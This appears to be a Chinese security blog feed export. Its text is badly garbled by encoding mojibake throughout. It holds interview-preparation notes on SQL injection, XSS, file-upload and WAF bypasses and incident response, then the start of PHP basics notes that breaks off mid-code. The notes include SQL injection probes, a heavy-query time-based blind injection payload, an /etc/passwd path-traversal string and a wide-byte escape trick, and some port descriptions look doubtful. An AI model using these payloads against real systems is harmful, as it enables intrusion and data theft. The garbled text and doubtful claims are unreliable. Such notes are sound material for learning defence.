rel="noopener">https://github.com/hacklcx/hfish/releasesåŒä¸Š</a></p><h1 id="7-2021å¹´HWé¢è¯•é‡åˆ°çš„é—®é¢˜"><a href="#7-2021å¹´HWé¢è¯•é‡åˆ°çš„é—®é¢˜" class="headerlink" title="7.2021å¹´HWé¢è¯•é‡åˆ°çš„é—®é¢˜"></a>7.2021å¹´HWé¢è¯•é‡åˆ°çš„é—®é¢˜</h1><h2 id="3-27é¢è¯•é¢˜ç›®ï¼š"><a href="#3-27é¢è¯•é¢˜ç›®ï¼š" class="headerlink" title="3.27é¢è¯•é¢˜ç›®ï¼š"></a>3.27é¢è¯•é¢˜ç›®ï¼š</h2><p><strong>é’ˆå¯¹æ—¶é—´ç›²æ³¨ä½ ä¼šé‡‡ç”¨ä»€ä¹ˆå‡½æ•°ï¼š</strong>sleepå‡½æ•° substrå‡½æ•°</p><p><strong>é’ˆå¯¹æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„è¿‡æ»¤ä½ ä¼šé‡‡å–ä»€ä¹ˆæªæ–½ï¼š</strong></p><p>å‰ç«¯ï¼šä½¿ç”¨.jspã€.aspã€.phtmlç­‰ç»•è¿‡</p><p><a href="https://blog.csdn.net/qq_39101049/article/details/89109456" target="_blank" rel="noopener">åç«¯ï¼š</a></p><p><strong>SQLæ³¨å…¥çš„åŸç†ï¼š</strong>SQLæ³¨å…¥æ˜¯æŒ‡Webåº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥æ•°æ®çš„åˆæ³•æ€§æœªè¿›è¡Œåˆ¤æ–­ã€å¤„ç†ï¼Œå‰ç«¯ä¼ å…¥çš„å‚æ•°æ˜¯æ”»å‡»è€…å¯æ§çš„ï¼Œå¹¶ä¸”å‚æ•°è¢«æ­£å¸¸çš„å¸¦å…¥åˆ°æ•°æ®åº“æŸ¥è¯¢ï¼Œå°±å¯¼è‡´äº†sqlæ³¨å…¥æ¼æ´çš„å‡ºç°</p><p><strong>SQLæ³¨å…¥çš„åˆ†ç±»ï¼š</strong>å¸ƒå°”ç›²æ³¨ã€æŠ¥é”™å‹æ³¨å…¥ã€å­—ç¬¦å‹æ³¨å…¥ã€æ•°å­—å‹æ³¨å…¥ç­‰ã€‚</p><p><strong>Xssæ¼æ´çš„åŸç†ï¼š</strong>æœªå¯¹ç”¨æˆ·è¾“å‡ºçš„æ•°æ®è¿›è¡Œè¿‡æ»¤æ£€æµ‹æˆ–è€…è¿‡æ»¤ä¸å®Œå…¨ å°±è¾“å‡ºåˆ°äº† å‰ç«¯ä»£ç ä¸­ å¯¼è‡´jsä»£ç æ‰§è¡Œ é€ æˆxssæ¼æ´</p><p><strong>å¦‚æœé‡åˆ°æ”»å‡»ä½ ä¼šæ€ä¹ˆåšï¼š</strong>å…ˆåˆ†ææµé‡ï¼Œåœ¨æŸ¥çœ‹æ—¥å¿—çœ‹ä¸€ä¸‹æ”»å‡»çš„IPåœ°å€ï¼Œæœ€åå°ç¦è¯¥IPåœ°å€</p><h2 id="3-31é¢è¯•é¢˜ç›®ï¼š"><a href="#3-31é¢è¯•é¢˜ç›®ï¼š" class="headerlink" title="3.31é¢è¯•é¢˜ç›®ï¼š"></a>3.31é¢è¯•é¢˜ç›®ï¼š</h2><p><strong>SQLæ³¨å…¥æ—¶é—´ç›²æ³¨çš„å‡½æ•°ï¼š</strong>lengthï¼ˆï¼‰è¿”å›å­—ç¬¦ä¸²é•¿åº¦ã€asciiï¼ˆï¼‰è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²çš„asciiç ã€midï¼ˆï¼‰å–å‡ºå­—ç¬¦ä¸²ä¸€éƒ¨åˆ†å€¼ã€substrï¼ˆï¼‰æˆªå–å­—ç¬¦ä¸²ã€hexï¼ˆï¼‰è¿”å›16è¿›åˆ¶æ•°ã€sleepï¼ˆï¼‰æ—¶é—´æ³¨å…¥æ ¸å¿ƒå‡½æ•°ã€ifï¼ˆï¼‰åˆ¤æ–­å‡½æ•°</p><p><strong>åº”æ€¥å“åº”ï¼šå¸¸è§çš„åº”æ€¥å“åº”äº‹ä»¶åˆ†ä¸ºï¼š</strong></p><p>Webå…¥ä¾µï¼šç½‘é¡µæŒ‚é©¬ã€ä¸»é¡µç¯¡æ”¹ã€webshell</p><p>ç³»ç»Ÿå…¥ä¾µï¼šç—…æ¯’æœ¨é©¬ã€å‹’ç´¢è½¯ä»¶ã€è¿œæ§åé—¨</p><p>ç½‘ç»œæ”»å‡»ï¼šDDOSæ”»å‡»ã€DNSåŠ«æŒã€ARPæ¬ºéª—</p><p><strong>Linuxæ–‡ä»¶æº¯æºï¼š</strong>è¿œæ§ï¼šæ‹¿æ²™ç›’åˆ†æwebshellï¼Œçœ‹çœ‹æ—¥å¿—æœ‰å“ªäº›ipå¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œäº†è®¿é—®ã€‚Webï¼šåˆ†ææ¶æ„æ–‡ä»¶æå–IP</p><p><strong>SQLæ³¨å…¥å­—ç¬¦å‹å’Œæ•°å­—å‹çš„åŒºåˆ«ï¼š</strong>å­—ç¬¦å‹æ³¨å…¥è¯­å¥éœ€è¦ä½¿ç”¨é—­åˆè¯­å¥ï¼Œè€Œæ•°å­—å‹æ³¨å…¥çš„è¯­å¥ä¸éœ€è¦é—­åˆ</p><p><strong>107å’Œ11ç«¯å£çš„æœåŠ¡ï¼š</strong>107è¿œç¨‹éšè”½çš„æ§åˆ¶è®¿é—®æœåŠ¡ã€11ç³»ç»ŸçŠ¶æ€ç›‘æ§</p><p><strong>SQLæ³¨å…¥ç»•è¿‡WAFï¼š</strong>å¤§å°å†™ç»•è¿‡ã€æ›¿æ¢å…³é”®å­—ã€ç©ºæ ¼ç»•è¿‡ã€å†…è”æ³¨é‡Šã€æ¯”è¾ƒç¬¦ç»•è¿‡ã€å®½å­—èŠ‚ç»•è¿‡</p><p><strong>Xssç»•è¿‡WAFï¼š</strong>å€ŸåŠ©é»‘åå•ç»•è¿‡ã€æ•°å­—å­—ç¬¦ç¼–ç ç»•è¿‡ã€å¤§å°å†™ç»•è¿‡ã€æ ‡ç­¾åŒå†™ã€ç©ºå­—èŠ‚ç»•è¿‡ã€Unicodeåˆ†éš”ç¬¦</p><p><strong>å¦‚ä½•é€šè¿‡æµé‡åˆ†æåˆ¤æ–­æ”»å‡»ç±»å‹ï¼š</strong>é€šè¿‡æµé‡åˆ†æå‘é€çš„payloadï¼Œåˆ†æpayloadçš„æ„é€ è¿›è¡Œåˆ¤æ–­ã€‚å½“å‘ç°payloadä¸­å­˜åœ¨SQLè¯­å¥åˆ™è¯¥æ”»å‡»ç±»å‹ä¸ºSQLæ³¨å…¥ã€‚å½“payloadä¸­å‘ç°å‰ç«¯ä»£ç åˆ™è¯¥æ”»å‡»ä¸ºxssæ”»å‡»ã€‚å½“payloadä¸­å‘ç°æ–‡ä»¶åè¿›è¡Œç‰¹æ®Šä¿®æ”¹æˆ–è€…å°è¯•ç»•è¿‡è¿‡æ»¤ä¾‹å¦‚ï¼šphPç­‰åˆ™è¯¥æ”»å‡»æ–¹å¼ä¸ºæ–‡ä»¶ä¸Šä¼ æ”»å‡»ã€‚</p><p><strong>å¦‚ä½•é€šè¿‡æµé‡åˆ†æåˆ¤æ–­æ˜¯å¦ä¸ºä½¿ç”¨sqlmapè¿›è¡Œçš„æ”»å‡»ï¼š</strong>1ã€ä½¿ç”¨sqlmapè¿›è¡Œæ”»å‡»ä¼šäº§ç”Ÿå¤§é‡æ•°æ®2ã€payloadä¸­ä¼šå­˜åœ¨SQLè¯­å¥</p><p><strong>å¸¸è§çš„ç«¯å£å¯¹åº”çš„æœåŠ¡ï¼š</strong>11ç³»ç»ŸçŠ¶æ€ç›‘æ§ã€21FTPæ–‡ä»¶ä¼ è¾“ã€22SSHã€23Telnetè¿œç¨‹ç™»å½•ã€25SMTPé‚®ä»¶ä¼ è¾“ã€53DNSæœåŠ¡å™¨ç«¯å£ã€69TFTPæ–‡ä»¶ä¼ è¾“ã€80httpã€107è¿œç¨‹ç™»å½•ç»ˆç«¯109&amp;110POP3é‚®ä»¶æ¥æ”¶ã€443Httpsã€1433MSSQLæ•°æ®åº“ã€1521ORACLEæ•°æ®åº“ã€3306MySQLæ•°æ®åº“ã€3389è¿œç¨‹è¿æ¥æ¡Œé¢ã€8080Tomcatï¼Œè¿™é‡Œæ˜¯<a href="https://wenku.baidu.com/view/f3cfa0b4da38376bae1fae2d.html" target="_blank" rel="noopener">ç«¯å£å¤§å…¨</a></p><p><strong>é’ˆå¯¹æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„è¿‡æ»¤ä½ ä¼šé‡‡å–ä»€ä¹ˆæªæ–½ï¼š</strong>å‰ç«¯ï¼šä½¿ç”¨burpæŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åç¼€æˆ–è€…ç¦ç”¨jsã€‚åç«¯ï¼šä¿®æ”¹http Header content-typeä¸ºå…è®¸å­—æ®µã€00æˆªæ–­ç»•è¿‡ä¸Šä¼ ã€æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ã€åå•åˆ—è¡¨ç»•è¿‡ã€ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡ã€htaccessæ–‡ä»¶ç»•è¿‡ã€å†™å…¥æ–¹æ³•ç»•è¿‡</p><h2 id="4-1é¢è¯•é¢˜ç›®ï¼š"><a href="#4-1é¢è¯•é¢˜ç›®ï¼š" class="headerlink" title="4.1é¢è¯•é¢˜ç›®ï¼š"></a>4.1é¢è¯•é¢˜ç›®ï¼š</h2><p><strong>å¸¸è§çš„javaæ¼æ´ï¼š</strong>ä»£ç æ³¨å…¥ã€å‘½ä»¤æ³¨å…¥ã€è¿æ¥å­—ç¬¦ä¸²æ³¨å…¥ã€ä»»æ„æ–‡ä»¶ä¸‹è½½ã€ä»»æ„æ–‡ä»¶ä¸Šä¼ ã€ä»»æ„ç›®å½•éå†</p><p><strong>å¸¸è§çš„è„šæœ¬è¯­è¨€ï¼š</strong>JavaScriptã€phpã€VBScriptã€pythonç­‰</p><p><strong>SQLæ³¨å…¥åˆ†ä¸ºå‡ ç±»ï¼š</strong>å¸ƒå°”ç›²æ³¨ã€Unionæ³¨å…¥ã€æŠ¥é”™æ³¨å…¥ã€å®½å­—èŠ‚æ³¨å…¥ã€æ—¶é—´æ³¨å…¥ã€ä¸‡èƒ½å¯†ç ã€è¿‡æ»¤ç»•è¿‡</p><p><strong>å¸¸è§çš„webæ¼æ´ï¼š</strong>æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€SQLæ³¨å…¥æ¼æ´ã€xssæ¼æ´ã€æ–‡ä»¶åŒ…å«æ¼æ´ã€å¼±å£ä»¤ã€å‘½ä»¤æ‰§è¡Œæ¼æ´ç­‰</p><p><strong>å¸¸è§çš„å®‰å…¨è®¾å¤‡ï¼š</strong>WAFé˜²ç«å¢™ã€IDSå…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€IPSå…¥ä¾µé¢„é˜²ç³»ç»Ÿã€VPNç­‰</p><p><strong>ç›®å½•éå†çš„æ”»å‡»ç‰¹å¾ï¼š</strong>é€šè¿‡URLä¼ è¿‡æ¥çš„å‚æ•°ï¼Œè¿›è¡ŒURLè§£ç åå¯¹å…¶è¿›è¡Œåˆ†æï¼Œå…¶ä¸­å¤§éƒ¨åˆ†æƒ…å†µæ˜¯ä»¥../../../etc/passwdä½œä¸ºç¬¬ä¸€æ¬¡çš„è¦è¿›è¡Œç›®å½•ç©¿è¶Šæ—¶æ„é€ çš„payload</p><h2 id="é€šè¿‡ä»¥å‰å‚åŠ HWçš„å¤§ä½¬å¾—åˆ°çš„é¢è¯•é¢˜ï¼š"><a href="#é€šè¿‡ä»¥å‰å‚åŠ HWçš„å¤§ä½¬å¾—åˆ°çš„é¢è¯•é¢˜ï¼š" class="headerlink" title="é€šè¿‡ä»¥å‰å‚åŠ HWçš„å¤§ä½¬å¾—åˆ°çš„é¢è¯•é¢˜ï¼š"></a><strong>é€šè¿‡ä»¥å‰å‚åŠ HWçš„å¤§ä½¬å¾—åˆ°çš„é¢è¯•é¢˜ï¼š</strong></h2><p><strong>1ã€è®²è¿°ä¸€ä¸‹æœç´¢æ¡†æ³¨å…¥çš„æ–¹æ³•ï¼š</strong>è¿™é‡Œçš„è¯­æ³•è·Ÿæ™®é€šæ³¨å…¥æ˜¯ä¸€æ ·çš„ï¼Œæœç´¢æ¡†æ–‡æœ¬æ³¨å…¥é—­åˆæ˜¯æœ‰åŒºåˆ«çš„ï¼Œæœç´¢1â€™å¦‚æœæŠ¥é”™å¯èƒ½å­˜åœ¨æ¼æ´ï¼Œé‚£ä¹ˆå°±å°è¯•é—­åˆ+æ³¨é‡Šï¼Œ1â€™and 1=1 and â€˜1â€™=â€™1ã€‚å¦‚æœ1=2æŠ¥é”™é‚£ä¹ˆè¿™é‡Œå°±ç¡®å®šå­˜åœ¨æ³¨å…¥äº†ï¼Œæ¥ä¸‹æ¥æ„é€ è¯­å¥å³å¯ã€‚</p><p><strong>2ã€é€»è¾‘æ¼æ´çš„ç±»å‹ï¼š</strong></p><p>æ”¯ä»˜æ¼æ´ï¼šå¦‚æœç³»ç»Ÿæ²¡æœ‰åšå¥½ä»·æ ¼ï¼Œæ•°é‡ï¼Œæ”¯ä»˜çŠ¶æ€æ£€æµ‹ï¼Œé‚£ä¹ˆå°±å¯èƒ½å­˜åœ¨äº†æ”¯ä»˜æ¼æ´ï¼Œé€šè¿‡ä¿®æ”¹å¯¹åº”çš„ä¼ å‚ï¼Œä¾‹å¦‚å•†å“çš„é‡‘é¢ï¼Œä»¥ä½ä»·è´­ä¹°é«˜ä»·çš„ç‰©å“ã€‚</p><p>æ‰‹æœºéªŒè¯ç ç»•è¿‡ï¼Œä»»æ„å¯†ç é‡ç½®ï¼šæ­¤æ¼æ´ä¹Ÿæ˜¯ç”±äºç³»ç»Ÿæ²¡æœ‰åšå¥½æ£€æµ‹ï¼Œåªæ˜¯å‰ç«¯è¿›è¡Œäº†æ ¡éªŒï¼Œé‚£ä¹ˆé€šè¿‡burpæ”¹åŒ…å°±å¯ä»¥ç»•è¿‡ã€‚ä¾‹å¦‚åœ¨ä¿®æ”¹å¯†ç çš„åœ°æ–¹ï¼Œæ”¾åŒ…ï¼ŒæŠ“å–å“åº”çš„çŠ¶æ€ï¼Œä¿®æ”¹æ•°å€¼ï¼Œä¾‹å¦‚0æ”¹ä¸º1ï¼Œfalseæ”¹ä¸ºtrueï¼Œåœ¨æ”¾åŒ…ï¼Œå°±å¯ä»¥è¾¾åˆ°æ¬ºéª—å®¢æˆ·ç«¯çš„æ“ä½œã€‚è¿™æ ·çš„è¯ï¼Œæ‰¾å¯»å¤§é‡çš„æ‰‹æœºå·ï¼Œé€šè¿‡æŠ“åŒ…æ”¹åŒ…å¯¼è‡´äº†ä»»æ„å¯†ç é‡ç½®ã€‚</p><p>é‚®ç®±éªŒè¯ç å¯ä¼ªé€ ï¼šä¾‹å¦‚åœ¨æ‰¾ä¼šå¯†ç çš„åœ°æ–¹ï¼Œä¼šè®©ç”¨æˆ·è¾“å…¥é‚®ç®±ï¼Œç„¶åç»™ä½ å‘é€ä¸€æ®µé“¾æ¥ï¼Œé€šè¿‡å»é‚®ç®±æŸ¥çœ‹é“¾æ¥ï¼Œå¯ä»¥å‘ç°ä¸­é—´çš„ä¸€äº›å€¼æ˜¯åŠ å¯†çš„ï¼Œå¯é€šè¿‡è§£å¯†æ¥å‘ç°ï¼Œè¿™ä¸ªå€¼æ˜¯ä½ çš„é‚®ç®±ï¼Œæˆ–è€…ä¸€ä¸²éšæœºå€¼ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°è¯•æ„é€ è¿™ä¸²å€¼ï¼Œåœ¨å¦ä¸€ä¸ªç”¨æˆ·çš„åœ°æ–¹æ‰¾å›å¯†ç ã€‚</p><p><strong>3ã€åå°„å‹XSSå’ŒDOMå‹XSSçš„åŒºåˆ«ï¼š</strong>domå‹xssæ˜¯é€šè¿‡ä¿®æ”¹æˆ–è¯»å–docunmentçš„å±æ€§å’Œæ–¹æ³•è¿›è¡Œæ”»å‡»ï¼Œæ—¢æœ‰åå°„å‹ä¹Ÿæœ‰å­˜å‚¨å‹ï¼Œè€Œä¸”æ²¡æœ‰ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ã€‚</p><p><strong>4ã€Linuxä¸Šä¼ äº†webshellå¦‚ä½•æŸ¥æ€ï¼š</strong>é¦–å…ˆtopæŸ¥çœ‹è¿›ç¨‹ï¼Œæ˜¯å¦æœ‰cpuå ç”¨ç‡ç‰¹åˆ«é«˜çš„ä»¥åŠIDæ˜¯éšæœºæ•°çš„ï¼Œå¯ä»¥å°è¯•killè¿›ç¨‹ï¼Œå†æ¬¡æŸ¥çœ‹è¿˜ä¼šä¸ä¼šå‡ºç°ã€‚ç„¶åå¯ä»¥ç”¨ps -ef|gredæŸ¥çœ‹è¿›ç¨‹è¯¦ç»†ä¿¡æ¯ï¼Œç”¨/procæ‰¾åˆ°è¿›ç¨‹ï¼Œcp+szä¸‹è½½æ–‡ä»¶æ”¾å…¥å¾®æ­¥åœ¨çº¿äº‘æ²™ç®±è¿›è¡Œåˆ†æã€‚ç¡®è®¤æ˜¯æœ¨é©¬å°±åˆ é™¤æ–‡ä»¶ã€‚å†cat/etc/rcæ’æŸ¥å¼€æœºå¯åŠ¨é¡¹å’Œcat/etc/crontabæ’æŸ¥å®šæ—¶ä»»åŠ¡ï¼Œlast,lastlogç­‰æ’æŸ¥æ—¥å¿—å’Œå¯ä»¥å¯ç–‘ç”¨æˆ·ã€‚</p><p><strong>5ã€åœ¨ä¸€ä¸ªå¤§æµé‡çš„ç¯å¢ƒä¸­ï¼Œå¦‚ä½•å¿«é€Ÿå¯¹æŠ¥è­¦è¿›è¡Œä¸€ä¸ªåˆ¤æ–­ï¼š</strong>å¦‚æœæ˜¯å¤§é‡ç›¸åŒæºipå‘èµ·çš„è¯·æ±‚ï¼Œé¦–å…ˆåˆ¤æ–­æ˜¯ä¸æ˜¯ä¸€ä¸ªè¯¯æŠ¥ã€‚å¦‚æœæ˜¯å†…éƒ¨é—®é¢˜å¯¼è‡´çš„è¯¯æŠ¥å¯ä»¥è¯·æ±‚ç”²æ–¹è¿›è¡Œæ•´æ”¹ï¼Œå¦‚æœç”²æ–¹æ‹’ç»æ•´æ”¹å°±æŠŠè¿™ä¸ªæ‹‰å…¥ç™½åå•ã€‚åŒæ ·å¦‚æœæ˜¯å¤§é‡ç›¸åŒçš„æºipå¯¹åŒä¸€ä¸ªipæˆ–è€…ç½‘æ®µæœ‰å¤§é‡æŠ¥è­¦ï¼Œå¯ä»¥è€ƒè™‘æ˜¯æ‰«æå™¨æˆ–è€…çˆ†ç ´ï¼Œæ¯”å¦‚æŸ¥çœ‹å‚æ•°ï¼Œå·±æ–¹æ˜¯javaæ­å»ºçš„ç½‘ç«™ï¼Œå´å‡ºç°äº†phpçš„è¯­å¥ï¼Œå¯ä»¥åˆ¤æ–­æ˜¯æ‰«æå™¨åœ¨æ‰«æã€‚</p><h1 id="é•¿äº­é¢è¯•é¢˜ï¼š"><a href="#é•¿äº­é¢è¯•é¢˜ï¼š" class="headerlink" title="é•¿äº­é¢è¯•é¢˜ï¼š"></a>é•¿äº­é¢è¯•é¢˜ï¼š</h1><p>1<strong>ã€sleepå‡½æ•°è¢«ç¦ç”¨åï¼Œå¦‚ä½•è¿›è¡Œæ—¶é—´ç›²æ³¨ï¼š</strong></p><p>BENCHMARKï¼ŒGet_lockå‡½æ•°ï¼Œå½“éƒ½è¢«ç¦ç”¨åå¯ä»¥ç”¨è®¡ç®—é‡æ¯”è¾ƒå¤§çš„è¯­å¥ä½¿æ•°æ®åº“æŸ¥è¯¢æ—¶é—´å˜é•¿ï¼Œä»è€Œè¾¾åˆ°å»¶æ—¶æ³¨å…¥çš„æ•ˆæœã€‚ mysqlï¼šAND (SELECT count(<em>) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);<br><em>*2ã€CSRFæ€ä¹ˆé˜²æŠ¤ï¼š</em></em></p><p>å°½é‡ä½¿ç”¨POSTï¼Œé™åˆ¶GETã€æµè§ˆå™¨cookieç­–ç•¥ã€åŠ éªŒè¯ç ç­‰<br><strong>3ã€å¦‚æœä¸€å°æœåŠ¡å™¨è¢«å…¥ä¾µåï¼Œä½ ä¼šå¦‚ä½•åšåº”æ€¥å“åº”ï¼š</strong></p><p>å‡†å¤‡ç›¸å…³å·¥å…·ã€æŸ¥åé—¨ç­‰å·¥å…·ã€åˆæ­¥åˆ¤æ–­äº‹ä»¶ç±»å‹ï¼Œæ—¶é—´ç­‰çº§ã€æŠ‘åˆ¶èŒƒå›´ï¼Œéš”ç¦»ä½¿å—å®³é¢ä¸ç»§ç»­æ‰©å¤§ã€æŸ¥æ‰¾åŸå› ï¼Œå°å µæ”»å‡»æºã€ä¸šåŠ¡æ¢å¤æ­£å¸¸æ°´å¹³ã€æ€»ç»“ï¼ŒæŠ¥å‘Šï¼Œå¹¶ä¿®å¤ï¼Œç›‘æ§<br><strong>4ã€å¦‚ä½•åˆ¤æ–­SQLæ³¨å…¥ï¼Œæœ‰å“ªäº›æ–¹æ³•ï¼š</strong></p><p>æäº¤é”™è¯¯è¯­å¥æ˜¯å¦æœ‰å¼‚å¸¸ï¼Œé™¤æ­¤ä¹‹å¤–è¿™äº›æ˜¾ç¤ºçš„é”™è¯¯å¯ä»¥é€šè¿‡sleep,ä¿®çœ è¯­å¥æ‰§è¡Œ5ç§’ç­‰ï¼Œé™¤æ­¤ä¹‹å¤–é€šè¿‡DNSlogåˆ¤æ–­æ˜¯è¿˜æœ‰ä¼ å›å€¼<br><strong>5ã€å®½å­—èŠ‚æ³¨å…¥åŸç†ï¼š</strong></p><p>åœ¨mysqlä¸­ä½¿ç”¨äº†gbkç¼–ç ï¼Œå ç”¨2ä¸ªå­—èŠ‚,è€Œmysqlçš„ä¸€ç§ç‰¹æ€§,GBKæ˜¯å¤šå­—èŠ‚ç¼–ç ï¼Œå®ƒè®¤ä¸ºä¸¤ä¸ªå­—èŠ‚å°±ä»£è¡¨ä¸€ä¸ªæ±‰å­—ï¼Œæ‰€ä»¥%dfæ—¶å€™ä¼šå’Œè½¬ä¹‰ç¬¦\ %5cè¿›è¡Œç»“åˆ,æ‰€ä»¥å•å¼•å·å°±é€ƒé€¸äº†å‡ºæ¥,å½“ç¬¬ä¸€ä¸ªå­—èŠ‚çš„asciiç å¤§äº128ï¼Œå°±å¯ä»¥äº†ã€‚</p><p><strong>6ã€Webshellæ£€æµ‹æœ‰å“ªäº›æ–¹æ³•ï¼š</strong></p><p>grepã€å…³é”®è¯ã€å…³é”®å‡½æ•°ã€å®‰å…¨ç‹—ã€Dç›¾</p><p><strong>7ã€SSRFæ¼æ´æˆå› é˜²å¾¡ç»•è¿‡ï¼š</strong></p><p>æ¨¡æ‹ŸæœåŠ¡å™¨å¯¹å…¶å®ƒèµ„æºè¿›è¡Œè¯·æ±‚ IPæ¢æµ‹ï¼Œå¦‚æœæƒ³æ¼æ´åˆ©ç”¨å¿…éœ€è¦æ„é€ å¥½Payload ç¦æ­¢è·³è½¬ï¼Œé™åˆ¶åè®®ï¼Œå†…å¤–ç½‘é™åˆ¶ï¼ŒURLé™åˆ¶ é’ˆå¯¹IPæ ¼å¼</p><p><strong>8ã€XSSæ”»å‡»åŸç†ï¼š</strong></p><p>åå°„å‹xssåœ¨æµè§ˆå™¨ä¸Šè¿è¡Œä¸€éå°±ä¼šé€ æˆçš„æ”»å‡»ï¼Œè¿è¡Œä¸€æ¬¡ï¼Œä¸ä¼šé•¿æ—¶é—´ç•™å­˜ã€å­˜å‚¨å‹xsså¤šè§äºè¯„è®ºå¤„ï¼Œæ¶æ„xssä»£ç å†™è¿›æœåŠ¡å™¨ä¸­ï¼Œæ¯ä¸€æ¬¡è¿è¡Œéƒ½ä¼šé€ æˆå±å®³ï¼Œé•¿æ—¶é—´ç•™å­˜</p><p><strong>9ã€SQLæ³¨å…¥é˜²æŠ¤æ–¹æ³•ï¼š</strong></p><p>ä½¿ç”¨å®‰å…¨çš„APIã€å¯¹è¾“å…¥çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡ŒEscapeè½¬ä¹‰å¤„ç†ã€ä½¿ç”¨ç™½åå•æ¥è§„èŒƒåŒ–è¾“å…¥éªŒè¯æ–¹æ³•ã€å¯¹å®¢æˆ·ç«¯è¾“å…¥è¿›è¡Œæ§åˆ¶ï¼Œä¸å…è®¸è¾“å…¥SQLæ³¨å…¥ç›¸å…³çš„ç‰¹æ®Šå­—ç¬¦ã€æœåŠ¡å™¨ç«¯åœ¨æäº¤æ•°æ®åº“è¿›è¡ŒSQLæŸ¥è¯¢ä¹‹å‰ï¼Œå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤è½¬ä¹‰æ›¿æ¢åˆ é™¤</p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPå¤§å­¦ä¹ </title>
      <link href="/2021/02/10/php-da-xue-xi/"/>
      <url>/2021/02/10/php-da-xue-xi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=386844&auto=1&height=66"></iframe><h1 id="PHPå‡½æ•°ï¼š"><a href="#PHPå‡½æ•°ï¼š" class="headerlink" title="PHPå‡½æ•°ï¼š"></a>PHPå‡½æ•°ï¼š</h1><h2 id="1-foreachç”¨æ³•ï¼š"><a href="#1-foreachç”¨æ³•ï¼š" class="headerlink" title="1.foreachç”¨æ³•ï¼š"></a>1.foreachç”¨æ³•ï¼š</h2><pre><code>$x = array(1,2,3,4,5)foreach ($x as $y) {     //è¿™é‡Œçš„yä¾æ¬¡ä¸º1,2,3,4,5     }</code></pre><h2 id="2-issetç†è§£ï¼š"><a href="#2-issetç†è§£ï¼š" class="headerlink" title="2.issetç†è§£ï¼š"></a>2.issetç†è§£ï¼š</h2><pre><code>$q = isset($_POST[&#39;q&#39;])? $_POST[&#39;q&#39;] : &#39;&#39;;</code></pre><p>æ˜¯å¦Formæäº¤çš„å†…å®¹ä¸­æœ‰åä¸ºqçš„å€¼ï¼Œ å¦‚æœæœ‰åˆ™å–qçš„å€¼ï¼Œå¦åˆ™$qèµ‹å€¼ä¸ºç©ºå­—ç¬¦ä¸²ã€‚</p><h2 id="3-error-reporting-0"><a href="#3-error-reporting-0" class="headerlink" title="3.error_reporting(0);"></a>3.error_reporting(0);</h2><p>error_reporting(0);//å…³é—­æ‰€æœ‰<em>php</em>é”™è¯¯æŠ¥å‘Š</p><h2 id="4-include"><a href="#4-include" class="headerlink" title="4.include"></a>4.include</h2><p><strong>include å’Œ require é™¤äº†å¤„ç†é”™è¯¯çš„æ–¹å¼ä¸åŒä¹‹å¤–ï¼Œåœ¨å…¶ä»–æ–¹é¢éƒ½æ˜¯ç›¸åŒçš„ï¼š</strong></p><ul><li><p>require ç”Ÿæˆä¸€ä¸ªè‡´å‘½é”™è¯¯ï¼ˆE_COMPILE_ERRORï¼‰ï¼Œåœ¨é”™è¯¯å‘ç”Ÿåè„šæœ¬ä¼šåœæ­¢æ‰§è¡Œã€‚</p></li><li><p>include ç”Ÿæˆä¸€ä¸ªè­¦å‘Šï¼ˆE_WARNINGï¼‰ï¼Œåœ¨é”™è¯¯å‘ç”Ÿåè„šæœ¬ä¼šç»§ç»­æ‰§è¡Œã€‚</p></li><li><p><strong>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªå®šä¹‰å˜é‡çš„åŒ…å«æ–‡ä»¶ï¼ˆâ€vars.phpâ€ï¼‰ï¼š</strong></p></li><li><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$color</span><span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">;</span><span class="token variable">$car</span><span class="token operator">=</span><span class="token string">'BMW'</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>è¿™äº›å˜é‡å¯ç”¨åœ¨è°ƒç”¨æ–‡ä»¶ä¸­ï¼š</strong></p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>èœé¸Ÿæ•™ç¨‹(runoob.com)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>æ¬¢è¿æ¥åˆ°æˆ‘çš„ä¸»é¡µ!<span class="token tag"><span class="token tag"><span 